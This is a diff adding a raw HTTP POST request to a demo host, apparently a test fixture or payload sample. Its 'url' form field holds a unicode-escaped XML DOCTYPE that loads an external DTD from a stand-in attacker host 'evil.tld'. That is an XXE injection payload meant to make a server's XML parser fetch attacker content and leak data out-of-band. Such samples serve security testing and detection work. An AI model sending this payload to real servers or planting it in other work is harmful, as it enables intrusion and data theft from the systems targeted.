@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Connection: close
+
+url=\u003C!DOCTYPE r SYSTEM \u0022http://evil.tld/evil.dtd\u0022\u003E
